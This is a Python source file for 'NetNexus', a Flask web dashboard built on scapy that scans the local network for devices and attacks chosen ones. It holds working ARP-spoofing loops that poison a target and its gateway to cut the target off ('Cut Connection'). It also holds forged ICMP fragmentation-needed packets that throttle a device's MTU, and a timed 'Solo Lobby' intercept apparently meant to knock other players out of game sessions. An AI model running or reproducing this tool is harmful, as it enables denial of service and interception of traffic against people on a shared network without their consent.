import os
import time
import threading
import socket
import sys
import logging
from scapy.all import ARP, Ether, IP, ICMP, srp, sendp, conf
from flask import Flask, jsonify, request, render_template_string

# Disable Flask startup logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# --- Application State ---
state = {
    "scanning": False,
    "gateway_ip": "",
    "subnet": "192.168.1.0/24",
    "iface": None,
    "devices": [], # list of dicts: {'ip': str, 'mac': str, 'vendor': str}
    "active_attacks": {}, # dict of ip: threading.Event()
    "active_mtu_limits": {}, # dict of ip: {'event': threading.Event(), 'val': int}
    "solo_lobby_active": False,
    "solo_lobby_timer": 0,
    "nicknames": {} # dict of mac: str
}

def get_default_network_info():
    try:
        iface, local_ip, gw_ip = conf.route.route("0.0.0.0")
        subnet = f"{local_ip.rsplit('.', 1)[0]}.0/24"
        return gw_ip, subnet, iface
    except:
        return "192.168.1.1", "192.168.1.0/24", conf.iface

state["gateway_ip"], state["subnet"], state["iface"] = get_default_network_info()

# --- Backend Network Logic ---
def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=state["iface"], timeout=2, verbose=0)
        if ans: return ans[0][1].hwsrc
    except: pass
    return None

def spoof_loop(target_ip, gateway_ip, stop_event):
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac or not gateway_mac: return
        while not stop_event.is_set():
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), iface=state["iface"], verbose=0)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=state["iface"], verbose=0)
            time.sleep(2)
    except: pass

def mtu_loop(target_ip, gateway_ip, mtu_limit, stop_event):
    try:
        target_mac = get_mac(target_ip)
        if not target_mac: return
        
        while not stop_event.is_set():
            # Construct ICMP Fragmentation Needed packet
            # Use the nexthopmtu parameter available in newer scapy versions or unused field
            try:
                icmp = ICMP(type=3, code=4, nexthopmtu=int(mtu_limit))
            except:
                icmp = ICMP(type=3, code=4, unused=int(mtu_limit))
                
            pkt = Ether(dst=target_mac)/IP(src=gateway_ip, dst=target_ip)/icmp/IP(src=target_ip, dst=gateway_ip)
            sendp(pkt, iface=state["iface"], verbose=0)
            time.sleep(1)
    except Exception as e:
        print(f"[!] MTU Limit error: {e}")

def run_arp_scan(subnet):
    state["scanning"] = True
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), iface=state["iface"], timeout=5, retry=1, verbose=0)
        found_devices = []
        for s, r in ans:
            mac = r.hwsrc
            vendor = conf.manufdb._resolve_MAC(mac)
            if vendor == mac: vendor = "Unknown"
            found_devices.append({'ip': r.psrc, 'mac': mac, 'vendor': vendor})
            
        existing_ips = [d['ip'] for d in state["devices"]]
        for d in found_devices:
            if d['ip'] not in existing_ips:
                state["devices"].append(d)
    except Exception as e:
        print(f"[!] Scan error: {e}")
    finally:
        state["scanning"] = False

def timed_intercept_logic(target_ip, gateway_ip, duration_ms):
    state["solo_lobby_active"] = True
    state["solo_lobby_timer"] = float(duration_ms) / 1000.0
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac: return
        
        stop_event = threading.Event()
        threading.Thread(target=spoof_loop, args=(target_ip, gateway_ip, stop_event), daemon=True).start()
        
        while state["solo_lobby_timer"] > 0:
            time.sleep(0.1)
            state["solo_lobby_timer"] -= 0.1
            
        stop_event.set()
        
        if target_mac and gateway_mac:
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
            
    except Exception as e:
        print(f"[!] Timed cut error: {e}")
    finally:
        state["solo_lobby_active"] = False
        state["solo_lobby_timer"] = 0

# --- Web API Endpoints ---
@app.route('/api/status', methods=['GET'])
def api_status():
    devices_enriched = []
    for d in state["devices"]:
        mtu_limit = None
        if d["ip"] in state["active_mtu_limits"]:
            mtu_limit = state["active_mtu_limits"][d["ip"]]["val"]
            
        devices_enriched.append({
            "ip": d["ip"],
            "mac": d["mac"],
            "vendor": d.get("vendor", "Unknown"),
            "nickname": state["nicknames"].get(d["mac"], ""),
            "is_cut": d["ip"] in state["active_attacks"],
            "mtu_limit": mtu_limit
        })
        
    return jsonify({
        "gateway_ip": state["gateway_ip"],
        "subnet": state["subnet"],
        "scanning": state["scanning"],
        "devices": devices_enriched,
        "solo_lobby_active": state["solo_lobby_active"],
        "solo_lobby_timer": max(0, state["solo_lobby_timer"])
    })

@app.route('/api/nickname', methods=['POST'])
def api_nickname():
    mac = request.json.get('mac')
    nickname = request.json.get('nickname', '')
    if mac:
        state["nicknames"][mac] = nickname
    return jsonify({"success": True})

@app.route('/api/scan', methods=['POST'])
def api_scan():
    if not state["scanning"]:
        data = request.json
        if data and 'subnet' in data:
            state["subnet"] = data['subnet']
        if data and 'gateway' in data:
            state["gateway_ip"] = data['gateway']
            
        state["devices"] = [] # Clear old list
        threading.Thread(target=run_arp_scan, args=(state["subnet"],), daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/toggle_cut', methods=['POST'])
def api_toggle_cut():
    target_ip = request.json.get('ip')
    gateway_ip = state["gateway_ip"]
    
    if target_ip == gateway_ip:
        return jsonify({"error": "Cannot cut the gateway."}), 400
        
    if target_ip in state["active_attacks"]:
        state["active_attacks"][target_ip].set()
        del state["active_attacks"][target_ip]
    else:
        stop_event = threading.Event()
        state["active_attacks"][target_ip] = stop_event
        threading.Thread(target=spoof_loop, args=(target_ip, gateway_ip, stop_event), daemon=True).start()
        
    return jsonify({"success": True, "is_cut": target_ip in state["active_attacks"]})

@app.route('/api/toggle_mtu', methods=['POST'])
def api_toggle_mtu():
    target_ip = request.json.get('ip')
    mtu_val = request.json.get('mtu', 300)
    gateway_ip = state["gateway_ip"]
    
    if target_ip == gateway_ip:
        return jsonify({"error": "Cannot limit gateway."}), 400
        
    if target_ip in state["active_mtu_limits"]:
        state["active_mtu_limits"][target_ip]['event'].set()
        del state["active_mtu_limits"][target_ip]
    else:
        try:
            mtu_val = int(mtu_val)
        except:
            mtu_val = 300
        stop_event = threading.Event()
        state["active_mtu_limits"][target_ip] = {'event': stop_event, 'val': mtu_val}
        threading.Thread(target=mtu_loop, args=(target_ip, gateway_ip, mtu_val, stop_event), daemon=True).start()
        
    return jsonify({"success": True})

@app.route('/api/solo_lobby', methods=['POST'])
def api_solo_lobby():
    target_ip = request.json.get('ip')
    duration_ms = request.json.get('duration_ms', 8000)
    gateway_ip = state["gateway_ip"]
    
    if state["solo_lobby_active"]:
        return jsonify({"error": "Process already running"}), 400
    if not target_ip or target_ip == gateway_ip:
        return jsonify({"error": "Invalid target IP"}), 400
        
    threading.Thread(target=timed_intercept_logic, args=(target_ip, gateway_ip, duration_ms), daemon=True).start()
    return jsonify({"success": True})

# --- Embedded HTML/JS Template ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NetNexus Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        th { cursor: pointer; user-select: none; }
        th:hover { background-color: rgba(255, 255, 255, 0.05); }
    </style>
</head>
<body class="bg-gray-900 text-gray-200 font-sans min-h-screen flex flex-col">

    <!-- Header -->
    <header class="bg-gray-800 border-b border-gray-700 shadow-lg p-4 flex justify-between items-center">
        <div class="flex items-center space-x-3">
            <div class="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center">
                <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
            </div>
            <h1 class="text-xl font-bold text-white tracking-wide">NetNexus<span class="text-blue-400">Web</span></h1>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-grow p-6 max-w-7xl mx-auto w-full">
        
        <!-- Global Solo Lobby Banner -->
        <div id="solo-status-container" class="hidden bg-red-900/50 border border-red-500 p-6 rounded-lg shadow-xl text-center mb-6">
            <div class="text-3xl font-black text-red-500 mb-2">Solo Lobby Active: <span id="solo-timer">12.0</span>s</div>
            <div class="text-red-400 font-bold uppercase tracking-widest animate-pulse">Intercepting Traffic...</div>
        </div>

        <div id="view-network" class="space-y-6 block">
            <div class="bg-gray-800 p-6 rounded-lg shadow-md border border-gray-700 flex flex-wrap gap-4 items-end">
                <div>
                    <label class="block text-xs font-semibold text-gray-400 mb-1 uppercase">Subnet</label>
                    <input type="text" id="inp-subnet" class="bg-gray-900 border border-gray-600 text-white text-sm rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5" placeholder="192.168.1.0/24">
                </div>
                <div>
                    <label class="block text-xs font-semibold text-gray-400 mb-1 uppercase">Gateway Router</label>
                    <input type="text" id="inp-gateway" class="bg-gray-900 border border-gray-600 text-white text-sm rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5" placeholder="192.168.1.1">
                </div>
                <button id="btn-scan" onclick="triggerScan()" class="bg-blue-600 hover:bg-blue-500 text-white font-bold py-2.5 px-6 rounded-md transition shadow-lg flex items-center">
                    <svg id="icon-scan" class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                    <span id="text-scan">Scan Network</span>
                </button>
            </div>

            <div class="bg-gray-800 rounded-lg shadow-md border border-gray-700 overflow-x-auto">
                <table class="w-full text-sm text-left text-gray-300 min-w-[800px]">
                    <thead class="text-xs text-gray-400 uppercase bg-gray-900 border-b border-gray-700">
                        <tr>
                            <th scope="col" class="px-4 py-4" onclick="setSort('ip')">IP Address <span id="sort-ip"></span></th>
                            <th scope="col" class="px-4 py-4" onclick="setSort('mac')">MAC Address <span id="sort-mac"></span></th>
                            <th scope="col" class="px-4 py-4" onclick="setSort('vendor')">Vendor <span id="sort-vendor"></span></th>
                            <th scope="col" class="px-4 py-4" onclick="setSort('nickname')">Nickname <span id="sort-nickname"></span></th>
                            <th scope="col" class="px-4 py-4" onclick="setSort('is_cut')">Status <span id="sort-is_cut"></span></th>
                            <th scope="col" class="px-4 py-4 text-right">Actions</th>
                        </tr>
                    </thead>
                    <tbody id="device-table-body">
                        <tr><td colspan="6" class="px-6 py-8 text-center text-gray-500">Run a scan to find devices. Check console for errors.</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </main>

    <script>
        let focusedInputId = null;
        let pendingNicknames = {};
        let pendingTimes = {};
        let pendingMtu = {};
        
        let currentSortCol = 'ip';
        let sortDesc = false;

        function setSort(col) {
            if (currentSortCol === col) {
                sortDesc = !sortDesc;
            } else {
                currentSortCol = col;
                sortDesc = false;
            }
            updateSortIcons();
            fetchStatus(); 
        }
        
        function updateSortIcons() {
            const cols = ['ip', 'mac', 'vendor', 'nickname', 'is_cut'];
            cols.forEach(c => {
                const el = document.getElementById('sort-' + c);
                if (el) {
                    if (c === currentSortCol) {
                        el.innerText = sortDesc ? '▼' : '▲';
                    } else {
                        el.innerText = '';
                    }
                }
            });
        }

        async function updateNickname(mac, nickname) {
            await fetch('/api/nickname', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({mac, nickname})
            });
        }

        async function fetchStatus() {
            try {
                const res = await fetch('/api/status');
                const data = await res.json();
                
                if (!document.getElementById('inp-subnet').value) document.getElementById('inp-subnet').value = data.subnet;
                if (!document.getElementById('inp-gateway').value) document.getElementById('inp-gateway').value = data.gateway_ip;

                const btnScan = document.getElementById('btn-scan');
                const textScan = document.getElementById('text-scan');
                const iconScan = document.getElementById('icon-scan');
                if (data.scanning) {
                    btnScan.classList.replace('bg-blue-600', 'bg-gray-600');
                    btnScan.disabled = true;
                    textScan.innerText = "Scanning...";
                    iconScan.classList.add('animate-spin');
                } else {
                    btnScan.classList.replace('bg-gray-600', 'bg-blue-600');
                    btnScan.disabled = false;
                    textScan.innerText = "Scan Network";
                    iconScan.classList.remove('animate-spin');
                }

                // Sort devices
                let sortedDevices = data.devices;
                if (currentSortCol) {
                    sortedDevices = sortedDevices.sort((a, b) => {
                        let valA = a[currentSortCol] !== undefined && a[currentSortCol] !== null ? a[currentSortCol] : '';
                        let valB = b[currentSortCol] !== undefined && b[currentSortCol] !== null ? b[currentSortCol] : '';
                        
                        if (currentSortCol === 'ip') {
                            const numA = valA.split('.').map(Number).reduce((acc, val) => (acc << 8) + val, 0);
                            const numB = valB.split('.').map(Number).reduce((acc, val) => (acc << 8) + val, 0);
                            return sortDesc ? numB - numA : numA - numB;
                        }
                        if (typeof valA === 'boolean') valA = valA ? 1 : 0;
                        if (typeof valB === 'boolean') valB = valB ? 1 : 0;
                        if (typeof valA === 'string') valA = valA.toLowerCase();
                        if (typeof valB === 'string') valB = valB.toLowerCase();
                        
                        if (valA < valB) return sortDesc ? 1 : -1;
                        if (valA > valB) return sortDesc ? -1 : 1;
                        return 0;
                    });
                }

                renderTable(sortedDevices, data.solo_lobby_active);

                const statusContainer = document.getElementById('solo-status-container');
                const timerEl = document.getElementById('solo-timer');
                
                if (data.solo_lobby_active) {
                    statusContainer.classList.remove('hidden');
                    timerEl.innerText = data.solo_lobby_timer.toFixed(1);
                } else {
                    statusContainer.classList.add('hidden');
                }

            } catch (err) {
                console.error("Failed to fetch status", err);
            }
        }

        function renderTable(devices, solo_lobby_active) {
            const tbody = document.getElementById('device-table-body');
            if (devices.length === 0) {
                if(!document.getElementById('btn-scan').disabled) {
                    tbody.innerHTML = '<tr><td colspan="6" class="px-6 py-8 text-center text-gray-500">No devices found.</td></tr>';
                }
                return;
            }

            let html = '';
            devices.forEach((dev, index) => {
                const is_cut = dev.is_cut || solo_lobby_active;
                let statusBadge = is_cut 
                    ? '<span class="bg-red-500/20 text-red-400 text-xs font-medium px-2.5 py-0.5 rounded border border-red-500/20 block text-center mb-1">Disconnected</span>'
                    : '<span class="bg-emerald-500/20 text-emerald-400 text-xs font-medium px-2.5 py-0.5 rounded border border-emerald-500/20 block text-center mb-1">Connected</span>';
                
                if (dev.mtu_limit !== null) {
                    statusBadge += `<span class="bg-yellow-500/20 text-yellow-400 text-xs font-medium px-2.5 py-0.5 rounded border border-yellow-500/20 block text-center mt-1">MTU: ${dev.mtu_limit}</span>`;
                }

                const actionCutText = dev.is_cut ? 'Restore' : 'Cut Connection';
                const actionCutColor = dev.is_cut ? 'bg-gray-600 hover:bg-gray-500' : 'bg-red-600 hover:bg-red-500';
                
                const currentNick = pendingNicknames[dev.mac] !== undefined ? pendingNicknames[dev.mac] : dev.nickname;
                const currentTime = pendingTimes[dev.ip] !== undefined ? pendingTimes[dev.ip] : "8000";
                
                const isMtuActive = dev.mtu_limit !== null;
                const currentMtuVal = pendingMtu[dev.ip] !== undefined ? pendingMtu[dev.ip] : (isMtuActive ? dev.mtu_limit : "300");
                const actionMtuColor = isMtuActive ? 'bg-orange-600 hover:bg-orange-500' : 'bg-yellow-600 hover:bg-yellow-500 text-gray-900';
                const actionMtuText = isMtuActive ? 'Stop MTU' : 'Limit MTU';

                html += `
                <tr class="border-b border-gray-700 hover:bg-gray-750 transition">
                    <td class="px-4 py-3 font-mono font-bold text-white whitespace-nowrap">${dev.ip}</td>
                    <td class="px-4 py-3 font-mono text-gray-400 whitespace-nowrap">${dev.mac}</td>
                    <td class="px-4 py-3 text-gray-400 whitespace-nowrap truncate max-w-[150px]" title="${dev.vendor}">${dev.vendor}</td>
                    <td class="px-4 py-3">
                        <input type="text" id="nick-${dev.mac}" class="bg-gray-900 border border-gray-600 text-white text-sm rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full p-1.5" 
                            placeholder="Nickname..." 
                            value="${currentNick}" 
                            onfocus="focusedInputId = this.id"
                            onblur="focusedInputId = null; pendingNicknames['${dev.mac}'] = undefined; updateNickname('${dev.mac}', this.value)"
                            oninput="pendingNicknames['${dev.mac}'] = this.value">
                    </td>
                    <td class="px-4 py-3 align-middle">${statusBadge}</td>
                    <td class="px-4 py-3 text-right">
                        <div class="flex flex-col items-end space-y-2">
                            <!-- Top row: Cut Connection -->
                            <div>
                                <button onclick="toggleCut('${dev.ip}')" class="${actionCutColor} text-white text-xs font-bold py-1.5 px-3 rounded whitespace-nowrap transition w-32">
                                    ${actionCutText}
                                </button>
                            </div>
                            
                            <!-- Middle row: Limit MTU -->
                            <div class="flex items-center space-x-2">
                                <input type="number" id="mtu-${dev.ip}" class="bg-gray-900 border border-gray-600 text-white text-xs rounded-md focus:ring-blue-500 focus:border-blue-500 w-16 p-1 text-center" 
                                    placeholder="MTU" value="${currentMtuVal}"
                                    onfocus="focusedInputId = this.id"
                                    onblur="focusedInputId = null"
                                    oninput="pendingMtu['${dev.ip}'] = this.value">
                                <button onclick="toggleMtu('${dev.ip}', 'mtu-${dev.ip}')" class="${actionMtuColor} font-bold text-xs py-1.5 px-3 rounded whitespace-nowrap transition w-24">
                                    ${actionMtuText}
                                </button>
                            </div>

                            <!-- Bottom row: Solo Lobby -->
                            <div class="flex items-center space-x-2">
                                <input type="number" id="time-${dev.ip}" class="bg-gray-900 border border-gray-600 text-white text-xs rounded-md focus:ring-blue-500 focus:border-blue-500 w-16 p-1 text-center" 
                                    placeholder="ms" value="${currentTime}"
                                    onfocus="focusedInputId = this.id"
                                    onblur="focusedInputId = null"
                                    oninput="pendingTimes['${dev.ip}'] = this.value">
                                <button onclick="triggerSoloLobby('${dev.ip}', 'time-${dev.ip}')" ${solo_lobby_active ? 'disabled' : ''} class="bg-indigo-600 hover:bg-indigo-500 disabled:bg-gray-600 disabled:cursor-not-allowed text-white text-xs font-bold py-1.5 px-3 rounded whitespace-nowrap transition w-24">
                                    Solo Lobby
                                </button>
                            </div>
                        </div>
                    </td>
                </tr>`;
            });
            
            // Only update DOM if not currently typing, to prevent stealing focus
            if (focusedInputId) {
                return;
            }
            tbody.innerHTML = html;
        }

        async function triggerScan() {
            const subnet = document.getElementById('inp-subnet').value;
            const gateway = document.getElementById('inp-gateway').value;
            await fetch('/api/scan', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({subnet, gateway})
            });
            fetchStatus();
        }

        async function toggleCut(ip) {
            await fetch('/api/toggle_cut', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip})
            });
            fetchStatus();
        }

        async function toggleMtu(ip, inputId) {
            const mtuVal = document.getElementById(inputId).value;
            await fetch('/api/toggle_mtu', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: ip, mtu: parseInt(mtuVal) || 300})
            });
            fetchStatus();
        }

        async function triggerSoloLobby(targetIp, timeInputId) {
            if(!targetIp) return;
            const timeVal = document.getElementById(timeInputId).value;
            const durationMs = parseInt(timeVal) || 8000;
            
            await fetch('/api/solo_lobby', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: targetIp, duration_ms: durationMs})
            });
            fetchStatus();
        }

        updateSortIcons();
        setInterval(fetchStatus, 1000); // 1 second fast poll for UI snappy-ness
        fetchStatus();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    print("==================================================")
    print(" NETNEXUS DOCKER SERVER Starting...")
    print(" Listening on 0.0.0.0:5050")
    print("==================================================")
    app.run(host='0.0.0.0', port=5050, debug=False)